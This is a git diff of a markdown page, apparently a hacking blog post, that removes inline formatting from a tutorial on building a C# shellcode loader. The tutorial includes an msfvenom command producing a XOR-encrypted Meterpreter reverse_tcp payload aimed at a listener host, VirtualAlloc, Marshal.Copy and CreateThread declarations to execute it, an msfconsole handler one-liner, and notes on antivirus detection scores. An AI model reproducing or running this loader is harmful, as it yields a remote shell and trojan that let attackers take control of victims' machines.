@@ -14,13 +14,13 @@ There should be whitespace between paragraphs.
 There should be whitespace between paragraphs. We recommend including a README, or a file with information about your project.
 -->
 
-# [](#header-1) What is *`shellcode`* ?
+# [](#header-1) What is shellcode ?
 
-In hacking, a `shellcode` is a `small piece of code used as the payload` in the exploitation of a software vulnerability. It is called "shellcode" because it typically `starts a command shell` from which the attacker can control the `compromised machine`, but any piece of code that performs a similar task can be called shellcode.
+In hacking, a shellcode is a small piece of code used as the payload in the exploitation of a software vulnerability. It is called "shellcode" because it typically starts a command shell from which the attacker can control the compromised machine, but any piece of code that performs a similar task can be called shellcode.
 
 # [](#header-2) Methodology
 
-* Generate `encrypted-xored` shellcode in csharp format with `msfvenom`. Don't forget to `store the encrypt-key to decrypt` the shellcode before inject it.
+* Generate encrypted-xored shellcode in csharp format with msfvenom. Don't forget to store the encrypt-key to decrypt the shellcode before inject it.
 
 ```console
 msfvenom -p windows/x64/meterpreter/reverse_tcp lport=4444 lhost=192.168.1.66 -f csharp --encrypt xor --encrypt-key 'k'
@@ -28,7 +28,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp lport=4444 lhost=192.168.1.66 -f
 <br>
 
 
-* VirtualAlloc: `Allocate memory` for the future process ran by shellcode.
+* VirtualAlloc: Allocate memory for the future process ran by shellcode.
 
 ```cs
 [DllImport("kernel32.dll")] 
@@ -40,7 +40,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp lport=4444 lhost=192.168.1.66 -f
 ```
 <br>
 
-* Marshal.Copy: Copy shellcode byte to `destination memory block`. It's used to for moving the shellcode bytes to te `allocate memory` that we did with VirtualAlloc.
+* Marshal.Copy: Copy shellcode byte to destination memory block. It's used to for moving the shellcode bytes to te allocate memory that we did with VirtualAlloc.
   
 ```cs 
 Marshal.Copy(byte[] source,
@@ -51,7 +51,7 @@ Marshal.Copy(byte[] source,
 ```
 <br>
 
-* CreateThread: Create a `thread in our process` to execute the shellcode.
+* CreateThread: Create a thread in our process to execute the shellcode.
 
 ```cs  
 private static extern IntPtr CreateThread(uint lpThreadAttributes,
@@ -64,7 +64,7 @@ private static extern IntPtr CreateThread(uint lpThreadAttributes,
 ```
 <br>
 
-* Run `handler` in metasploit and listen for `incoming connection`.
+* Run handler in metasploit and listen for incoming connection`.
 
 ```console
 msfconsole -q -x 'use multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set lhost 0.0.0.0;set lport 4444;run'
@@ -81,7 +81,7 @@ msfconsole -q -x 'use multi/handler;set payload windows/x64/meterpreter/reverse_
 
 # Result
 
-Our malware is `detected by many antivirus as trojan` like `Windows Defender`. Unfortunaly, this technique is too old and easily detected for modern antivirus. But my curiosity wanted to test if `encrypt-xored payload has any effect on score detection`. I just recreate payload without any encryption and replace it in my code. I compiled the code into exe file and loaded it in [virustotal.com](https://virustotal.com) `to compare score`. The no-encryption `improve considerably the score` and multiply it by ~2. 
+Our malware is detected by many antivirus as trojan like Windows Defender. Unfortunaly, this technique is too old and easily detected for modern antivirus. But my curiosity wanted to test if encrypt-xored payload has any effect on score detection. I just recreate payload without any encryption and replace it in my code. I compiled the code into exe file and loaded it in [virustotal.com](https://virustotal.com) to compare score. The no-encryption improve considerably the score and multiply it by ~2. 
 
 </br>   
 
